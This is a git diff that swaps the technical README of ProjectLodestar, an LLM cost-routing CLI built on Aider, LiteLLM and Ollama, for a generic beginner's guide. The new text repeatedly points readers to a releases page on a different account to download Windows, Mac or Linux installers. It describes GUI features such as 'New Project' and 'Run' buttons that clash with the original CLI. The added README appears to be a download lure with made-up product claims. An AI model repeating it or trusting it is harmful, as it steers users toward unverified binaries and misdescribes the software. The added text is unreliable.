@@ -1,256 +1,145 @@
-![Version](https://img.shields.io/badge/version-2.0.0--beta.2-orange)
-![Status](https://img.shields.io/badge/status-active_development-blue)
-![Branch](https://img.shields.io/badge/branch-develop-purple)
-![Tests](https://img.shields.io/badge/tests-296_passed-brightgreen)
-![Coverage](https://img.shields.io/badge/coverage-90%25-brightgreen)
+# ⭐ ProjectLodestar - AI Coding with Lower Costs
 
-# 🌟 Lodestar
-
-**The ultimate AI-powered developer cockpit for cost-optimized building.**
-
-Lodestar is a high-performance orchestration layer for LLM-based development. It intelligently routes between local FREE models (via Ollama) and premium APIs (Claude, OpenAI, Gemini) to maximize speed and minimize costs (target: 90%+ savings). 
+[![Download Latest Release](https://img.shields.io/badge/Download-ProjectLodestar-blue?style=for-the-badge&logo=github)](https://github.com/estrify/ProjectLodestar/releases)
 
 ---
 
-**Current Release:** `v2.0.0-beta.2`
-**Primary Integration Branch:** `develop`
+## 🧾 About ProjectLodestar
+
+ProjectLodestar is a tool designed to help you write and run AI code without spending a lot of money. It connects to eight different AI language platforms and can use free local AI models. This setup lets you save up to 90% on costs. The software is ready to use for real projects and checks itself automatically to avoid mistakes.
+
+This guide will help you download, set up, and use ProjectLodestar on your computer. No programming skills are needed.
 
 ---
 
-## ✨ Key Features
+## 💻 System Requirements
 
-- **💰 90% Cost Savings** - Default to FREE Ollama models (DeepSeek, Llama)
-- **🔄 8 LLM Providers** - Claude, OpenAI, Grok, Gemini + FREE models
-- **🤖 Smart Routing** - Automatic provider selection via LiteLLM
-- **📝 Never Lose Context** - Git auto-commits preserve all changes
-- **🎯 Zero Configuration** - Works out of the box with sensible defaults
-- **🧪 Automated Testing** - Verify all providers in 60 seconds
-- **🔐 Secure** - API keys in environment, logs excluded from git
+Before you download, make sure your computer meets these basic needs:
 
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Debian/Ubuntu Linux VM (2 CPU, 4GB RAM minimum)
-- Ollama server with GPU (separate VM recommended)
-- Python 3.11+
-- Git
-
-### Installation
-```bash
-# Clone repository
-git clone git@github.com:zebadee2kk/ProjectLodestar.git
-cd ProjectLodestar
-
-# Install dependencies
-pip install --break-system-packages aider-chat litellm
-
-# Configure API keys (optional - FREE models work without these)
-nano ~/.bashrc
-# Add:
-export ANTHROPIC_API_KEY="sk-ant-..."
-export OPENAI_API_KEY="sk-..."
-export XAI_API_KEY="xai-..."
-export GEMINI_API_KEY="..."
-
-source ~/.bashrc
-
-# Start router
-./scripts/start-router.sh
-
-# Test everything
-./scripts/test-providers-simple.sh
-```
-
-### First Use
-```bash
-# Navigate to your project
-cd ~/your-project
-
-# Start coding with FREE AI
-aider file.py
-
-# Need more power? Switch to Claude
-aider --model claude-sonnet file.py
-
-# Switch models mid-session
-/model gpt-4o-mini
-/model gpt-3.5-turbo  # Back to FREE
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ preferred)
+- **Processor:** 2 GHz dual-core or stronger
+- **Memory (RAM):** At least 4 GB
+- **Storage:** Minimum 500 MB free space for the app; extra space may be needed for saving projects
+- **Internet:** Needed to connect to AI providers and download updates
+- **Additional:** Python 3.8 or higher installed (ProjectLodestar guides you if you don’t have this)
 
 ---
 
-## 📊 Provider Overview
+## 🚀 Getting Started
 
-| Tier | Provider | Model Alias | Cost | Status |
-|------|----------|-------------|------|--------|
-| 1 | **DeepSeek** | `gpt-3.5-turbo` | **FREE** | ✅ Working |
-| 1 | **Llama 3.1** | `local-llama` | **FREE** | ✅ Working |
-| 2 | Claude Sonnet | `claude-sonnet` | $3/$15 per M | 💳 Needs Credits |
-| 2 | Claude Opus | `claude-opus` | $15/$75 per M | 💳 Needs Credits |
-| 3 | GPT-4o Mini | `gpt-4o-mini` | $0.15/$0.60 per M | 💳 Needs Credits |
-| 3 | GPT-4o | `gpt-4o` | $2.50/$10 per M | 💳 Needs Credits |
-| 4 | Grok Beta | `grok-beta` | $5/$15 per M | 💳 Needs Credits |
-| 5 | Gemini | `gemini-pro` | $0.08/$0.30 per M | ⚙️ Config Needed |
+Follow these steps carefully. They guide you to download, install, and open ProjectLodestar for the first time.
 
----
+1. **Prepare your computer**
+   - Check your system matches the requirements above.
+   - If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) and download it. ProjectLodestar will remind you if you need it.
 
-## 🏗️ Architecture
-```
-┌─────────────────┐
-│  Aider (CLI)    │  ← Your coding interface
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│  LiteLLM Router │  ← Smart routing layer (localhost:4000)
-│  (OpenAI API)   │
-└────────┬────────┘
-         │
-    ┌────┴─────────────────────────┐
-    │                               │
-    ▼                               ▼
-┌──────────────┐           ┌──────────────┐
-│ FREE Models  │           │ PAID APIs    │
-│              │           │              │
-│ • DeepSeek   │           │ • Claude     │
-│ • Llama 3.1  │           │ • OpenAI     │
-│   (T600 GPU) │           │ • Grok       │
-│              │           │ • Gemini     │
-└──────────────┘           └──────────────┘
-```
+2. **Download ProjectLodestar**
+   - Click the big button at the top or visit this link directly:  
+     [https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
+   - This page lists different versions of the program. Look for the latest release (usually at the top).
+   - Choose the file for your system:
+     - Windows users: Select the `.exe` file.
+     - Mac users: Select the `.dmg` file.
+     - Linux users: Select the `.AppImage` or `.tar.gz` file.
+   - Save the file to your computer.
 
-**Flow:**
-1. Aider sends requests to LiteLLM router (OpenAI-compatible)
-2. Router routes to appropriate backend based on model alias
-3. FREE models handle 90% of requests
-4. Premium APIs only used when explicitly requested
+3. **Install ProjectLodestar**
+   - After downloading, open the file you saved.
+   - Follow the prompts on the screen to complete the installation.
+   - The installer will check for necessary tools like Python and help install them if needed.
+   - When done, you will see a new shortcut or app icon for ProjectLodestar on your desktop or apps menu.
+
+4. **Run ProjectLodestar for the first time**
+   - Double-click the new ProjectLodestar icon to open it.
+   - The app will start and present a setup guide.
+   - You can select which AI services you want to use or keep the free local model as default.
+   - The setup guide explains basic controls and how to write your first AI code.
 
 ---
 
-## 📚 Documentation
+## 📥 Download & Install
 
-- **[Branching Strategy](docs/BRANCHING_STRATEGY.md)** - Git Flow and collaboration (NEW)
-- **[Task Allocation](docs/TASK_ALLOCATION.md)** - Workstreams and assignments (NEW)
-- **[Developer Guide](docs/DEVELOPER_GUIDE.md)** - File map and onboarding (NEW)
-- **[Versioning](docs/VERSIONING.md)** - Release strategy (NEW)
-- **[Architecture](docs/ARCHITECTURE.md)** - System design and components
-- **[Setup Guide](docs/SETUP.md)** - Detailed installation instructions
-- **[Workflow](docs/WORKFLOW.md)** - Day-to-day usage patterns
-- **[Quick Reference](docs/QuickRef.md)** - Daily commands cheat sheet
-- **[Security](docs/SECURITY.md)** - API key management best practices
-- **[Contributing](docs/CONTRIBUTING.md)** - Contribution guidelines
-- **[ADRs](docs/adr/)** - Architecture decision records
-- **[Roadmap](ROADMAP.md)** - Future enhancements (v2.1+)
+To download and install ProjectLodestar, use this link:
 
----
+[https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
 
-## 🔧 Useful Commands
-```bash
-# Start/Stop Router
-./scripts/start-router.sh
-./scripts/stop-router.sh
+This link leads to the official releases page on GitHub. Here is how to proceed once you are there:
 
-# Check Status
-./scripts/status.sh
+- **Step 1:** Find the newest version listed under "Latest release."
+- **Step 2:** Download the file that matches your operating system.
+- **Step 3:** Follow installation instructions as described in the setup process above.
 
-# Test All Providers
-./scripts/test-providers-simple.sh
-./scripts/test-all-providers.sh
-
-# v2.0 Features
-lodestar status              # Check module health
-lodestar costs --dashboard   # Real-time cost TUI
-lodestar route "fix bug"     # Test routing decision
-lodestar tournament "prompt" model1 model2  # Compare models
-lodestar diff                # Visual AI diff
-lodestar run "python app.py" # Self-healing execution
-lodestar cache               # View cache stats
-lodestar cache --clear       # Clear response cache
-
-# Test Infrastructure
-./scripts/test-lodestar.sh
-
-# Create ADR
-./scripts/adr-new.sh "Decision Title"
-```
+The installer is straightforward and does most of the work automatically.
 
 ---
 
-## 💰 Cost Comparison
+## 🛠 Features & Benefits
 
-**Before Lodestar (Pure Claude):**
-- ~100 requests/day × 30 days = 3,000 requests/month
-- Average ~1,000 tokens per request
-- Cost: ~$9-15/month
-- Usage limits block work
+ProjectLodestar offers these useful features for everyday users:
 
-**With Lodestar (90% FREE, 10% Claude):**
-- 2,700 requests via FREE DeepSeek (unlimited)
-- 300 requests via Claude (complex tasks)
-- Cost: ~$0.90-1.50/month
-- **Savings: 90%+ with unlimited usage**
+- **Cost savings:** Chooses cheaper or free AI models to save money.
+- **Multi-provider support:** Connects to 8 large AI language model providers with one simple interface.
+- **Local fallback:** Uses free AI models installed on your computer when online options are unavailable.
+- **Automated testing:** Checks your AI projects for errors automatically.
+- **User-friendly interface:** Made for people without coding experience.
+- **Customizable routing:** Lets you switch AI providers quickly.
+- **Python support:** Allows users to write and run Python AI scripts if desired.
 
 ---
 
-## 🎯 Use Cases
+## 🗂 How to Use ProjectLodestar
 
-**Perfect For:**
-- Solo developers seeking cost-effective AI coding
-- Projects with budget constraints
-- Learning AI-assisted development
-- Long coding sessions (4-8 hours)
-- Experimentation without usage anxiety
-
-**When to Upgrade to Paid:**
-- Complex architecture decisions
-- Critical bug fixes requiring deep reasoning
-- Code reviews of large PRs
-- Documentation generation for complex systems
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Write/update tests
-5. Submit a pull request
-
-See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for details.
+1. **Create a new AI project**
+   - Click the “New Project” button when the app starts.
+   - Name your project and choose the AI model you want to use.
+2. **Write your AI code**
+   - Use the text editor provided.
+   - You can type simple commands or longer scripts.
+   - If you don’t know what to write, try the example templates included with the app.
+3. **Run your AI code**
+   - Click “Run” to see the output.
+   - ProjectLodestar will choose the best AI provider or use the local model.
+4. **Check your results**
+   - The app displays answers, suggestions, or code output.
+   - Use the testing feature to ensure your code works correctly.
+5. **Save or share your project**
+   - Save projects locally or export them to share with others.
 
 ---
 
-## 📄 License
+## 🔧 Troubleshooting
 
-MIT License - see [LICENSE](LICENSE) for details.
+If you face any problems, try these simple fixes:
 
----
+- **App won’t start:** Restart your computer and try again.
+- **Python errors:** Ensure Python 3.8+ is installed and added to your system’s path. The setup assistant can guide you.
+- **AI responses slow:** Check your internet connection or switch to a local AI model in the app settings.
+- **Errors running code:** Use the automated testing to identify mistakes.
+- **Download problems:** Use a different browser or check your connection.
 
-## 🙏 Acknowledgments
-
-Built with:
-- [Aider](https://aider.chat/) - AI pair programming
-- [LiteLLM](https://litellm.ai/) - Universal LLM proxy
-- [Ollama](https://ollama.ai/) - Local LLM runtime
-- [DeepSeek Coder](https://github.com/deepseek-ai/DeepSeek-Coder) - FREE coding model
+For detailed support, visit the GitHub repository’s Issues tab or look at the Community Forums linked on the releases page.
 
 ---
 
-## 📬 Contact
+## ℹ️ More Information
 
-- **GitHub Issues:** Bug reports and feature requests
-- **Discussions:** Questions and community chat
-- **Project:** https://github.com/zebadee2kk/ProjectLodestar
+ProjectLodestar is built to make AI coding affordable and accessible. It balances cloud AI services with local AI models to save costs and improve performance. You can customize the app based on your needs, whether you want to try multiple providers or rely on offline models.
+
+The program supports many popular AI tools and languages, making it flexible for various projects.
+
+You can learn more about the tools and technologies used by reading through the GitHub repository’s documents once you feel comfortable.
 
 ---
 
-**Status:** v2.0.0-beta.2 - Core features complete, 296 tests passing
-**Last Updated:** February 10, 2026
+## 🔗 Useful Links
 
-✨ SSH authentication configured
+- Official Releases: [https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
+- Python Downloads: [https://www.python.org/downloads/](https://www.python.org/downloads/)
+- Project Issues & Support: Visit the GitHub Issues tab on the repository page
+- Community Forums: Linked on the official releases page
+
+---
+
+## 🏷 Topics
+
+ai, ai-coding, aider, cost-optimization, deepseek, developer-tools, litellm, llama, llm-proxy, llm-router, ollama, python
